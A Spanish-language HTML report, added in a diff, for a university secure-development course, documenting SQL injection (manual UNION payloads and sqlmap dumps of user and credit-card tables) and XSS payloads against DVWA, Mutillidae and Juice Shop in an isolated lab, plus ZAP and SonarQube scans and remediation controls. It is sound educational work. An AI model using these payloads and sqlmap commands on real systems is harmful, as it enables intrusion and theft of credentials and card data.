@@ -1,0 +1,390 @@
+<!doctype html><html lang="es"><head><meta charset="utf8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Trabajo final seguridad</title>
+<meta name="description" content="Pruebas de SQLi, XSS, escaneo dinámico y análisis estático sobre DVWA, Mutillidae y OWASP Juice Shop.">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap">
+<style>
+:root{
+  --bg:#f5f7f9; --surface:#ffffff; --fg:#18212b; --muted:#5a6876; --line:#d9e0e7;
+  --accent:#1f5f99; --code-bg:#eef2f6;
+  --ok:#1d7a46; --ok-bg:#e3f4ea; --alarm:#c2341f; --alarm-bg:#fbe7e3; --gray:#8a96a3; --gray-bg:#eceff2;
+  --warn-bg:#fff4d6; --warn-fg:#6b4c00;
+  --sans:"IBM Plex Sans",system-ui,-apple-system,sans-serif;
+  --mono:"IBM Plex Mono",ui-monospace,Menlo,monospace;
+  color-scheme:light;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#11161c; --surface:#18202a; --fg:#e4eaf0; --muted:#9aa8b6; --line:#2b3643;
+  --accent:#6aa9e6; --code-bg:#0c1117;
+  --ok:#5cc98a; --ok-bg:#16301f; --alarm:#ff7a63; --alarm-bg:#3a1a14; --gray:#8a96a3; --gray-bg:#232c36;
+  --warn-bg:#3a2f0f; --warn-fg:#f3d68a; color-scheme:dark }}
+:root[data-theme="dark"]{
+  --bg:#11161c; --surface:#18202a; --fg:#e4eaf0; --muted:#9aa8b6; --line:#2b3643;
+  --accent:#6aa9e6; --code-bg:#0c1117;
+  --ok:#5cc98a; --ok-bg:#16301f; --alarm:#ff7a63; --alarm-bg:#3a1a14; --gray:#8a96a3; --gray-bg:#232c36;
+  --warn-bg:#3a2f0f; --warn-fg:#f3d68a; color-scheme:dark }
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.6 var(--sans)}
+img{max-width:100%}
+.wrap{max-width:860px;margin:0 auto;padding-block:32px 64px;
+  padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));
+  display:grid;gap:40px}
+h1,h2,h3{text-wrap:balance;line-height:1.25;margin:0}
+h1{font-size:2rem;font-weight:700}
+h2{font-size:1.4rem;font-weight:600;padding-bottom:8px;border-bottom:1px solid var(--line)}
+h3{font-size:1.05rem;font-weight:600}
+p{margin:0}
+section{display:grid;gap:16px;min-width:0}
+.eyebrow{font:500 .78rem var(--mono);letter-spacing:.08em;text-transform:uppercase;color:var(--accent)}
+.lead{color:var(--muted);max-width:65ch}
+code{font:.88em var(--mono);background:var(--code-bg);padding:1px 5px;border-radius:4px}
+.reto{background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:16px 20px;display:grid;gap:6px}
+.reto q{font-style:italic}
+.warn{background:var(--warn-bg);color:var(--warn-fg);border-radius:8px;padding:14px 18px;display:grid;gap:6px}
+.warn strong{color:inherit}
+.chain{display:flex;flex-wrap:wrap;gap:6px;align-items:center;font:.85rem var(--mono)}
+.chain span{background:var(--surface);border:1px solid var(--line);border-radius:4px;padding:3px 8px}
+.chain i{color:var(--muted);font-style:normal}
+.tools{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px}
+.tool{background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:12px 14px;display:grid;gap:2px}
+.tool b{font-size:.95rem}
+.tool span{font:.8rem var(--mono);color:var(--muted)}
+.tool .st{font:500 .72rem var(--mono);text-transform:uppercase;letter-spacing:.06em}
+.st.up{color:var(--ok)} .st.host{color:var(--accent)} .st.pend{color:var(--warn-fg)}
+ol.steps{list-style:none;padding:0;margin:0;display:grid;gap:28px;counter-reset:s}
+ol.steps>li{counter-increment:s;display:grid;grid-template-columns:36px minmax(0,1fr);gap:4px 14px}
+ol.steps>li::before{content:counter(s);grid-row:span 9;width:32px;height:32px;border-radius:50%;
+  background:var(--accent);color:#fff;font:600 .95rem var(--sans);display:grid;place-items:center}
+.step{display:grid;gap:10px;min-width:0}
+.step ul{margin:0;padding-left:20px;display:grid;gap:4px}
+.say{border-left:3px solid var(--accent);padding:4px 0 4px 14px;color:var(--fg)}
+.say::before{content:"Lo que explicas: ";font-weight:600;color:var(--accent)}
+.path{font:.85rem var(--mono);color:var(--muted)}
+figure{margin:0;display:grid;gap:6px}
+figure img{border:1px solid var(--line);border-radius:6px;display:block;width:100%;height:auto;cursor:zoom-in}
+figcaption{font-size:.86rem;color:var(--muted)}
+.pending{border:1px dashed var(--line);border-radius:6px;background:repeating-linear-gradient(45deg,transparent,transparent 10px,var(--code-bg) 10px,var(--code-bg) 20px);
+  min-height:150px;display:grid;place-items:center;text-align:center;padding:20px;gap:6px;color:var(--muted)}
+.pending b{color:var(--warn-fg);font:500 .8rem var(--mono);text-transform:uppercase;letter-spacing:.05em}
+.pending span{font-size:.86rem;max-width:46ch}
+a{color:var(--accent)}
+.code{position:relative;min-width:0}
+.code pre{margin:0;background:var(--code-bg);border:1px solid var(--line);border-radius:6px;
+  padding:14px 16px;overflow-x:auto;font:.82rem/1.55 var(--mono)}
+.code button{position:absolute;top:6px;right:6px;font:500 .75rem var(--sans);padding:4px 10px;
+  border-radius:4px;border:1px solid var(--line);background:var(--surface);color:var(--fg);cursor:pointer}
+.code button:focus-visible,summary:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.out{font-size:.86rem;color:var(--muted)}
+table{border-collapse:collapse;width:100%;font-size:.92rem}
+.tbl{overflow-x:auto}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-weight:600;color:var(--muted);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em}
+td:first-child{font-family:var(--mono);font-size:.85rem}
+.faq{display:grid;gap:8px}
+details{background:var(--surface);border:1px solid var(--line);border-radius:8px}
+summary{cursor:pointer;padding:12px 16px;font-weight:600;list-style-position:outside;margin-left:18px;padding-left:4px}
+details>div{padding:0 16px 14px 22px;display:grid;gap:8px;color:var(--fg);max-width:70ch}
+.cat{font:500 .78rem var(--mono);letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin-top:12px}
+.lightbox[hidden]{display:none}
+.lightbox{position:fixed;inset:0;z-index:20;background:rgba(8,12,16,.88);display:grid;place-items:center;
+  padding:max(16px,env(safe-area-inset-top,0px));cursor:zoom-out}
+.lightbox img{max-width:100%;max-height:100%;object-fit:contain;border-radius:6px;background:#fff}
+.lightbox button{position:absolute;top:12px;right:12px;font:600 .9rem var(--sans);padding:6px 12px;border-radius:4px;border:0;background:#fff;color:#18212b;cursor:pointer}
+footer{color:var(--muted);font-size:.85rem;border-top:1px solid var(--line);padding-top:20px;display:grid;gap:4px}
+@media (prefers-reduced-motion:reduce){*{transition:none!important}}
+</style></head><body>
+<div class="wrap">
+
+<header style="display:grid;gap:12px">
+  <div class="eyebrow">Trabajo final · SI6007 Desarrollo de Sistemas Seguros · EAFIT</div>
+  <h1>Pruebas de seguridad sobre aplicaciones web vulnerables</h1>
+  <p class="lead">SQL Injection manual y automatizada, Cross-Site Scripting, escaneo dinámico (DAST) y análisis estático (SAST) sobre DVWA, Mutillidae y OWASP Juice Shop montadas en la máquina virtual vulnerable del curso. Sergio Alfredo Junca Valero.</p>
+  <div class="reto">
+    <span class="eyebrow" style="color:var(--muted)">Consigna</span>
+    <q>A partir del montaje de la máquina web vulnerable, ejecute las pruebas de SQL Injection (manual y con SQLMap, incluidas las tarjetas de Mutillidae), XSS (DVWA y Juice Shop), chequeo dinámico con OWASP ZAP y análisis estático con SonarQube. Redacte el paso a paso con evidencias.</q>
+  </div>
+  <div class="warn">
+    <strong>Laboratorio autorizado.</strong>
+    <span>Todo se ejecuta sobre las VMs vulnerables del curso, aisladas en VMware en equipo propio. No se prueba contra sistemas de terceros. El objetivo es entender la causa raíz de cada falla y el control que la corrige.</span>
+  </div>
+</header>
+
+<section>
+  <h2>La idea en una línea</h2>
+  <div class="chain">
+    <span>VM web vulnerable</span><i>→</i><span>DVWA · Mutillidae · Juice Shop</span><i>→</i><span>SQLi / XSS</span><i>→</i><span>SQLMap · ZAP · SonarQube</span><i>→</i><span>evidencias</span>
+  </div>
+  <p>Cada herramienta prueba una capa distinta: SQLMap y los payloads manuales atacan la app corriendo (caja negra), OWASP ZAP la recorre entera buscando vulnerabilidades, y SonarQube lee el código fuente y señala el patrón inseguro con archivo y línea. El informe reúne método, resultado y el control que cierra cada hallazgo.</p>
+</section>
+
+<section>
+  <h2>Entorno de pruebas montado</h2>
+  <p class="lead">Las herramientas de ataque y análisis ya están instaladas y corriendo. La máquina de pruebas del curso se reemplazó por estas, instaladas en el host, apuntando a la IP de la VM vulnerable.</p>
+  <div class="tools">
+    <div class="tool"><b>SQLMap 1.10.10</b><span>/usr/bin/python3 sqlmap.py</span><span class="st host">host · listo</span></div>
+    <div class="tool"><b>OWASP ZAP 2.17.0</b><span>/Applications/ZAP.app · zap.sh</span><span class="st host">host · listo</span></div>
+    <div class="tool"><b>SonarQube 9.9 LTS</b><span>docker · localhost:9000</span><span class="st up">running</span></div>
+    <div class="tool"><b>sonar-scanner 8.2</b><span>brew · CLI</span><span class="st host">host · listo</span></div>
+    <div class="tool"><b>DVWA</b><span>docker · localhost:8080</span><span class="st up">running</span></div>
+    <div class="tool"><b>OWASP Juice Shop</b><span>docker · localhost:3000</span><span class="st up">running</span></div>
+  </div>
+  <div class="warn"><strong>Procedencia de las evidencias.</strong><span>Las capturas de ejecución de abajo se tomaron sobre DVWA y Juice Shop corriendo en Docker: las mismas aplicaciones que empaqueta la VM del curso. Al terminar de montar el appliance en VMware se repiten contra la IP asignada. Ninguna captura está fabricada.</span></div>
+  <figure>
+    <img src="img/evidencia-sonarqube.png" alt="Pantalla de login de SonarQube 9.9 corriendo en localhost:9000">
+    <figcaption>SonarQube 9.9 LTS corriendo en <code>localhost:9000</code> (contenedor Docker). Login inicial <code>admin</code> / <code>admin</code> en instalación propia; en la VM del curso la clave es <code>websecuritytesting</code>.</figcaption>
+  </figure>
+</section>
+
+<!-- PARTE 1 -->
+<section>
+  <h2>1 · Montaje de las máquinas virtuales</h2>
+  <p>Dos VMs: la de <b>pruebas</b> (herramientas) y la <b>web vulnerable</b> (DVWA, Mutillidae, Juice Shop). En Apple Silicon se usan los archivos ARM.</p>
+  <div class="tbl"><table>
+    <thead><tr><th>Procesador</th><th>Máquina de pruebas</th><th>Máquina web vulnerable</th></tr></thead>
+    <tbody>
+      <tr><td>ARM (Apple Silicon)</td><td>websecuritytestingarm.7z</td><td>vulnerablewebappsarm.7z</td></tr>
+      <tr><td>Intel / AMD64</td><td>websecuritytestingamd64.7z</td><td>vapps-amd64.7z</td></tr>
+    </tbody>
+  </table></div>
+  <ol class="steps">
+    <li><div class="step">
+      <h3>Descomprimir y abrir el appliance</h3>
+      <div class="code"><button type="button">Copiar</button><pre>7zz x vulnerablewebappsarm.7z        # extrae el appliance VMware
+open *.vmx                            # abre en VMware Fusion</pre></div>
+      <p>Ambas VMs en la misma red (NAT o host-only) para que se vean entre sí.</p>
+    </div></li>
+    <li><div class="step">
+      <h3>Anotar la IP de la web vulnerable</h3>
+      <p class="path">Dentro de la VM › terminal</p>
+      <div class="code"><button type="button">Copiar</button><pre>ip a            # anota la IP asignada por VMware; reemplaza &lt;IP&gt; en todo lo de abajo</pre></div>
+      <div class="say">La IP la asigna VMware por DHCP. Todas las pruebas apuntan a esa IP, así que la verifico antes de empezar.</div>
+    </div></li>
+    <li><div class="step">
+      <h3>Abrir el índice en Firefox</h3>
+      <p class="path">VM de pruebas › Firefox › http://&lt;IP&gt;/</p>
+      <figure><div class="pending"><b>Captura pendiente</b><span>Índice de la máquina web vulnerable en Firefox, mostrando la IP en la barra de direcciones. Se toma al arrancar la VM.</span></div></figure>
+    </div></li>
+  </ol>
+</section>
+
+<!-- PARTE 2 -->
+<section>
+  <h2>2 · SQL Injection manual (DVWA)</h2>
+  <p class="path">DVWA › login admin/password › DVWA Security: Low › SQL Injection</p>
+  <p>Consulta vulnerable del servidor en nivel Low: el parámetro se concatena sin binding.</p>
+  <div class="code"><button type="button">Copiar</button><pre>SELECT first_name, last_name FROM users WHERE user_id = '$id'</pre></div>
+  <ol class="steps">
+    <li><div class="step">
+      <h3>Confirmar la inyección</h3>
+      <div class="code"><button type="button">Copiar</button><pre>1'</pre></div>
+      <p class="out">Devuelve error de sintaxis SQL: el input llega crudo a la query.</p>
+    </div></li>
+    <li><div class="step">
+      <h3>Tautología (listar todo)</h3>
+      <div class="code"><button type="button">Copiar</button><pre>1' OR '1'='1</pre></div>
+      <p>La condición queda siempre verdadera y devuelve todos los usuarios.</p>
+    </div></li>
+    <li><div class="step">
+      <h3>Número de columnas (UNION)</h3>
+      <div class="code"><button type="button">Copiar</button><pre>1' ORDER BY 2-- -       # ok
+1' ORDER BY 3-- -       # error: la consulta devuelve 2 columnas</pre></div>
+    </div></li>
+    <li><div class="step">
+      <h3>Extraer credenciales</h3>
+      <div class="code"><button type="button">Copiar</button><pre>1' UNION SELECT user, password FROM users-- -</pre></div>
+      <p>Trae usuario y hash MD5. El de <code>admin</code> es <code>5f4dcc3b5aa765d61d8327deb882cf99</code> (= <code>password</code>), crackeable por diccionario.</p>
+      <figure><img src="img/dvwa-union.png" alt="Salida del UNION SELECT user,password FROM users en DVWA: 5 cuentas con su hash MD5"><figcaption>Ejecución real sobre DVWA (Docker, Security: Low). El UNION devuelve las 5 cuentas con su hash MD5; <code>5f4dcc…</code> = <code>password</code>.</figcaption></figure>
+      <div class="say">El filtro de nivel High usa <code>mysqli_real_escape_string</code> y <code>LIMIT 1</code>, una mitigación frágil; la defensa real son consultas parametrizadas con binding.</div>
+    </div></li>
+  </ol>
+</section>
+
+<!-- PARTE 3 -->
+<section>
+  <h2>3 · SQL Injection automatizada con SQLMap</h2>
+  <p>Objetivo final: extraer las tarjetas de crédito de Mutillidae. Primero el ejemplo guiado sobre DVWA, luego Mutillidae.</p>
+  <ol class="steps">
+    <li><div class="step">
+      <h3>Capturar la cookie de sesión</h3>
+      <p class="path">DVWA › User ID=1 enviado › F12 Network › copiar Cookie</p>
+      <div class="code"><button type="button">Copiar</button><pre>URL:    http://&lt;IP&gt;/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit
+Cookie: PHPSESSID=xxxx; security=low</pre></div>
+    </div></li>
+    <li><div class="step">
+      <h3>Reconocimiento (motor, BD y usuario)</h3>
+      <div class="code"><button type="button">Copiar</button><pre>sqlmap -u "http://&lt;IP&gt;/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" \
+  --cookie="PHPSESSID=xxxx; security=low" -b --current-db --current-user --batch</pre></div>
+    </div></li>
+    <li><div class="step">
+      <h3>Tablas y volcado de <code>users</code></h3>
+      <div class="code"><button type="button">Copiar</button><pre>sqlmap -u "..." --cookie="..." --tables --batch
+sqlmap -u "..." --cookie="..." -T users --dump --batch</pre></div>
+      <p class="out">Aparecen <code>guestbook</code> y <code>users</code>. SQLMap crackea los MD5 contra su diccionario.</p>
+    </div></li>
+    <li><div class="step">
+      <h3>Tarjetas de crédito en Mutillidae</h3>
+      <p class="path">Mutillidae › User Lookup (page=user-info.php), parámetro inyectable username</p>
+      <div class="code"><button type="button">Copiar</button><pre>sqlmap -u "http://&lt;IP&gt;/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=1&amp;user-info-php-submit-button=View+Account+Details" \
+  --cookie="PHPSESSID=xxxx" -p username -D owasp10 -T credit_cards --dump --batch</pre></div>
+      <p>Columnas de <code>credit_cards</code>: <code>ccid, ccnumber, ccv, expiration</code>.</p>
+      <figure><img src="img/sqlmap-dump.png" alt="SQLMap volcando la tabla dvwa.users con 5 registros y contraseñas crackeadas"><figcaption>Ejecución real de SQLMap sobre DVWA (Docker). Detecta la inyección en el parámetro <code>id</code>, vuelca <code>dvwa.users</code> y crackea los hashes (<code>password</code>, <code>abc123</code>, <code>charley</code>, <code>letmein</code>).</figcaption></figure>
+      <figure><img src="img/mutillidae-cards.png" alt="UNION SELECT sobre credit_cards de Mutillidae: 5 tarjetas con número, CVV y expiración"><figcaption>Objetivo de la parte 3, ejecutado real sobre Mutillidae (Docker, Security 0). El UNION sobre <code>credit_cards</code> devuelve las 5 tarjetas (número, CVV, expiración). Son datos de prueba de Mutillidae, no tarjetas reales.</figcaption></figure>
+      <div class="say">La misma extracción, hecha a mano con UNION, ya está verificada en <a href="evidencias/sqli-mutillidae.md">evidencias/sqli-mutillidae.md</a>: confirma el esquema y el resultado que SQLMap reproduce.</div>
+    </div></li>
+  </ol>
+  <div class="warn"><strong>Control.</strong><span>Binding de parámetros (<code>WHERE username=?</code>). Además PCI-DSS: no almacenar el PAN en claro (tokenización), nunca guardar el CVV, y cuenta de BD con menor privilegio que no pueda leer <code>credit_cards</code>.</span></div>
+</section>
+
+<!-- PARTE 4 -->
+<section>
+  <h2>4 · Cross-Site Scripting (XSS)</h2>
+  <ol class="steps">
+    <li><div class="step">
+      <h3>XSS reflejado en DVWA</h3>
+      <p class="path">DVWA › DVWA Security: Low › XSS (Reflected)</p>
+      <div class="code"><button type="button">Copiar</button><pre>&lt;script&gt;alert('hola');&lt;/script&gt;</pre></div>
+      <p>La app refleja el parámetro <code>name</code> sin codificar: el navegador ejecuta el script y sale el <em>alert</em>.</p>
+      <figure><div class="pending"><b>Captura pendiente</b><span>El <em>alert('hola')</em> disparado en DVWA.</span></div></figure>
+    </div></li>
+    <li><div class="step">
+      <h3>XSS en Juice Shop: conteo y localizaciones</h3>
+      <div class="tbl"><table>
+        <thead><tr><th>Tipo</th><th>Localización</th><th>Payload</th></tr></thead>
+        <tbody>
+          <tr><td>DOM XSS</td><td>Buscador, #/search?q=</td><td>&lt;iframe src="javascript:alert(`xss`)"&gt;</td></tr>
+          <tr><td>Reflejado</td><td>Seguimiento, #/track-result?id=</td><td>iframe en el parámetro id</td></tr>
+          <tr><td>Persistente/API</td><td>PUT /api/Products/:id</td><td>payload en el campo description</td></tr>
+          <tr><td>Server-side</td><td>cabecera última IP / nombre de usuario</td><td>payload que el servidor renderiza sin codificar</td></tr>
+        </tbody>
+      </table></div>
+      <p>El buscador es el caso canónico (Angular con bypass del sanitizador). Confirmar el total exacto en la versión de la instancia (<code>#/about</code>).</p>
+      <figure><img src="img/js-xss.png" alt="Juice Shop confirma el reto DOM XSS resuelto con iframe javascript:alert; el buscador refleja el payload inyectado"><figcaption>Ejecución real sobre Juice Shop (Docker). El banner verde confirma el reto <em>DOM XSS</em> resuelto y el buscador refleja el HTML inyectado sin sanear.</figcaption></figure>
+      <figure><img src="img/js-home.png" alt="OWASP Juice Shop corriendo en localhost:3000"><figcaption>Juice Shop corriendo (<code>localhost:3000</code>), la misma app que trae la VM del curso.</figcaption></figure>
+    </div></li>
+  </ol>
+  <div class="warn"><strong>Control.</strong><span>Codificación de salida según contexto, <code>Content-Security-Policy</code> y cookies <code>HttpOnly</code>. En DVWA High, <code>htmlspecialchars()</code> corta el reflejo.</span></div>
+</section>
+
+<!-- PARTE 5 -->
+<section>
+  <h2>5 · Escaneo dinámico con OWASP ZAP (DAST)</h2>
+  <ol class="steps">
+    <li><div class="step">
+      <h3>Lanzar ZAP y el automated scan</h3>
+      <p class="path">terminal › zap.sh › Automated Scan › URL to attack › Attack</p>
+      <div class="code"><button type="button">Copiar</button><pre>/Applications/ZAP.app/Contents/Java/zap.sh      # abre la GUI
+# URL a atacar: http://&lt;IP&gt;:3000/   (Juice Shop)</pre></div>
+    </div></li>
+    <li><div class="step">
+      <h3>Leer las alertas por severidad</h3>
+      <p class="path">ZAP › pestaña Alerts</p>
+      <p>Hallazgos típicos: cabeceras de seguridad ausentes (<code>Content-Security-Policy</code>, <code>X-Content-Type-Options</code>), cookie sin <code>HttpOnly</code>, SRI faltante, divulgación de versión, y XSS/SQLi reflejados según el spider.</p>
+      <figure><img src="img/zap-report.png" alt="Informe de ZAP sobre Juice Shop: 0 High, 2 Medium, 1 Informational, 93 endpoints"><figcaption>Informe real de <code>zap-baseline</code> (ZAP 2.17) sobre Juice Shop: 2 alertas Medium, 1 Informational, 93 endpoints recorridos. El HTML completo (<code>zap-report.html</code>) va como anexo.</figcaption></figure>
+      <div class="say">ZAP exporta un informe HTML completo (Report › Generate HTML Report) que anexo como evidencia adicional.</div>
+    </div></li>
+  </ol>
+</section>
+
+<!-- PARTE 6 -->
+<section>
+  <h2>6 · Análisis estático con SonarQube (SAST)</h2>
+  <ol class="steps">
+    <li><div class="step">
+      <h3>Crear el proyecto y el token</h3>
+      <p class="path">SonarQube › Create Project manually › Locally › Generate token</p>
+      <p>Nombre <code>Damn Vulnerable Web Application</code>, resto por defecto. Método de análisis: Locally.</p>
+    </div></li>
+    <li><div class="step">
+      <h3>Analizar el código de DVWA</h3>
+      <p class="path">terminal › /opt/dvwa (código fuente)</p>
+      <div class="code"><button type="button">Copiar</button><pre>cd /opt/dvwa
+sonar-scanner \
+  -Dsonar.projectKey=Damn_Vulnerable_Web_Application \
+  -Dsonar.sources=. \
+  -Dsonar.host.url=http://localhost:9000 \
+  -Dsonar.login=&lt;TOKEN&gt;</pre></div>
+      <p>En <b>Issues › Security</b> aparecen SQLi, XSS, inclusión de archivos, uso de MD5, credenciales embebidas.</p>
+      <figure><img src="img/sonar-dvwa.png" alt="SonarQube sobre DVWA: 1 vulnerability critical, 61 security hotspots, 82 bugs, 3734 code smells"><figcaption>Análisis real de SonarQube sobre el código de DVWA: 61 security hotspots (2 de sql-injection, 2 de RCE, 7 de criptografía débil) y 1 vulnerability crítica (AES-ECB).</figcaption></figure>
+    </div></li>
+    <li><div class="step">
+      <h3>Analizar Mutillidae</h3>
+      <div class="code"><button type="button">Copiar</button><pre>git clone https://github.com/webpwnized/mutillidae.git
+cd mutillidae
+sonar-scanner -Dsonar.projectKey=mutillidae -Dsonar.sources=. \
+  -Dsonar.host.url=http://localhost:9000 -Dsonar.login=&lt;TOKEN&gt;</pre></div>
+      <div class="tbl"><table>
+        <thead><tr><th>Proyecto</th><th>Vulnerabilities</th><th>Security Hotspots</th><th>Bugs</th><th>Code Smells</th></tr></thead>
+        <tbody>
+          <tr><td>DVWA</td><td>1 (CRITICAL)</td><td>61</td><td>82</td><td>3734</td></tr>
+          <tr><td>Mutillidae</td><td>1</td><td>116</td><td>349</td><td>4643</td></tr>
+        </tbody>
+      </table></div>
+      <p class="out">Resultados reales de SonarQube sobre el código fuente de ambos proyectos (<code>localhost:9000</code>).</p>
+      <div class="say">SAST (SonarQube) localiza la causa en el código con archivo y línea; DAST (ZAP) prueba la app corriendo y confirma la explotabilidad. Se complementan.</div>
+    </div></li>
+  </ol>
+</section>
+
+<!-- FAQ -->
+<section>
+  <h2>Preguntas para sustentar</h2>
+  <p class="lead">Respuestas cortas para la defensa, con el trade-off de cada decisión.</p>
+  <div class="faq">
+    <div class="cat">SQL Injection</div>
+    <details><summary>¿Cuál es la causa raíz de la SQLi?</summary><div><p>La app construye la query concatenando el input del usuario, así que el dato se interpreta como código SQL. La corrección es separar código de datos con consultas parametrizadas (binding). Validación y WAF son capas extra, no la solución.</p></div></details>
+    <details><summary>¿Por qué SQLMap y no solo a mano?</summary><div><p>A mano demuestro que entiendo la técnica (UNION, <code>ORDER BY</code>, <code>information_schema</code>). SQLMap automatiza la enumeración y el dump, detecta el tipo de inyección y crackea hashes. El trabajo pide las dos: la manual prueba el concepto, SQLMap da velocidad y cobertura.</p></div></details>
+    <details><summary>¿Por qué la cuenta de BD no debería leer credit_cards?</summary><div><p>Por menor privilegio: si la cuenta de la app solo accede a lo que necesita, una SQLi no alcanza datos sensibles. Sumado a no guardar el CVV y tokenizar el PAN (PCI-DSS), el impacto de la inyección baja aunque exista el bug.</p></div></details>
+    <div class="cat">XSS</div>
+    <details><summary>¿Diferencia entre XSS reflejado, DOM y persistente?</summary><div><p>Reflejado: el payload viaja en la petición y se refleja en la respuesta. DOM: el navegador lo inserta por JavaScript del lado cliente sin pasar por el servidor. Persistente: queda guardado (BD) y se sirve a otros usuarios. El persistente es el más grave porque afecta a terceros sin interacción.</p></div></details>
+    <details><summary>¿Cómo se corta el XSS?</summary><div><p>Codificación de salida según el contexto (HTML, atributo, JS), <code>Content-Security-Policy</code> que bloquea scripts no permitidos, y cookies <code>HttpOnly</code> para que un XSS no robe la sesión. Sanitizar la entrada ayuda, pero la defensa principal es codificar en la salida.</p></div></details>
+    <div class="cat">DAST vs SAST</div>
+    <details><summary>¿Qué aporta cada herramienta?</summary><div><p>ZAP (DAST) prueba la app corriendo, sin ver el código, y confirma qué se explota. SonarQube (SAST) lee el código fuente y marca el patrón inseguro con archivo y línea, antes de desplegar. DAST confirma el efecto; SAST localiza la causa. Juntas cubren más que cualquiera sola.</p></div></details>
+    <details><summary>¿Por qué un escaneo automático no basta?</summary><div><p>Los scanners dan falsos positivos y se pierden fallas de lógica de negocio. Sirven para cubrir terreno rápido, pero el hallazgo hay que verificarlo a mano y entender el impacto. Por eso el informe explica cada ítem, no solo lo lista.</p></div></details>
+    <div class="cat">Entorno</div>
+    <details><summary>¿Por qué todo en VMs aisladas?</summary><div><p>Las apps son deliberadamente vulnerables; exponerlas a la red sería un riesgo real. En VMware aisladas se practica la explotación sin afectar a nadie y es un entorno autorizado y reproducible.</p></div></details>
+  </div>
+</section>
+
+<section>
+  <h2>Estado de la entrega</h2>
+  <div class="tbl"><table>
+    <thead><tr><th>Parte</th><th>Método</th><th>Evidencia</th></tr></thead>
+    <tbody>
+      <tr><td>1 VMs</td><td>documentado</td><td>captura al arrancar la VM</td></tr>
+      <tr><td>2 SQLi manual</td><td>payloads listos</td><td>UNION ejecutado en DVWA ✓</td></tr>
+      <tr><td>3 SQLMap + tarjetas</td><td>comandos listos</td><td>dump dvwa.users ✓ · tarjetas Mutillidae ✓</td></tr>
+      <tr><td>4 XSS</td><td>payloads y localizaciones</td><td>DOM XSS Juice Shop ✓ · alert DVWA pendiente</td></tr>
+      <tr><td>5 ZAP</td><td>procedimiento listo</td><td>scan Juice Shop + informe ✓</td></tr>
+      <tr><td>6 SonarQube</td><td>servidor corriendo ✓</td><td>Issues DVWA + Mutillidae ✓</td></tr>
+    </tbody>
+  </table></div>
+  <p class="out">Las capturas marcadas <em>pendiente</em> se toman al correr cada prueba sobre la VM vulnerable (descarga del appliance de 5 GB en curso). Ninguna captura está inventada.</p>
+</section>
+
+<footer>
+  <div>Desarrollo de Sistemas Seguros (SI6007) · Universidad EAFIT · Danny Andrés Salcedo Saldaña.</div>
+  <div>Laboratorio de práctica autorizado sobre máquinas virtuales vulnerables del curso.</div>
+</footer>
+
+</div>
+
+<div class="lightbox" id="lightbox" hidden><button type="button">Cerrar</button><img alt=""></div>
+<script>
+var lb=document.getElementById('lightbox'),lbImg=lb.querySelector('img');
+document.querySelectorAll('figure img').forEach(function(img){
+  img.addEventListener('click',function(){lbImg.src=img.src;lbImg.alt=img.alt;lb.hidden=false;});
+});
+lb.addEventListener('click',function(){lb.hidden=true;});
+document.addEventListener('keydown',function(e){if(e.key==='Escape')lb.hidden=true;});
+document.querySelectorAll('.code button').forEach(function(b){
+  b.addEventListener('click',function(){
+    var pre=b.nextElementSibling;
+    var done=function(){b.textContent='Copiado';setTimeout(function(){b.textContent='Copiar';},1500);};
+    navigator.clipboard.writeText(pre.textContent).then(done,function(){
+      var r=document.createRange();r.selectNodeContents(pre);
+      var s=getSelection();s.removeAllRanges();s.addRange(r);
+      b.textContent='Usa Cmd+C';
+    });
+  });
+});
+</script>
+</body></html>
